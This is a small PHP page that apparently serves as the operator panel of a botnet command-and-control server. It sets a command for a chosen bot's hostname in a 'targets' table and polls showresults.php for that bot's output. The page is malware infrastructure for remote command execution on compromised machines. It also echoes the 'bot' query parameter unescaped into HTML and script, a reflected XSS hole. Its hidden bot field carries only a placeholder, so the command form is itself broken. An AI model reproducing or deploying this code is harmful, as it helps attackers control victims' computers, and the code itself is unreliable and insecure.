<?php 
include 'session.php';
include 'conn.php';

if($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["command"]) && isset($_POST["bot"]))
{
    $setCommand = $mysql->prepare("update targets set command=? where hostname=?");
    $setCommand->bind_param("ss", $_POST["command"], $_POST["bot"]);
    $setCommand->execute();
}

?>

<html>
    <form action="" method="POST">
        <input type="text" name="command" placeholder="command"/>
        <input type="hidden" name="bot" placeholder="<?php echo $_GET['bot']; ?>"/>
        <input type="submit" name="submit" value="Set Command"/>
    </form>

    <textarea id="resultArea"></textarea>

    <script>
        function retrieveResult () {
            let xmlReq = new XMLHttpRequest();
            let url = "/showresults.php?bot="+"<?php echo $_GET["bot"]; ?>";
            xmlReq.open("GET", url, false);
            xmlReq.send(null);

            if (xmlReq.responseText.length > 2) {
                document.getElementById("resultArea").innerHTML = xmlReq.responseText;
                return;
            }
            setTimeout(retrieveResult, 2000);
        }
        
        retrieveResult();
    </script>
</html>
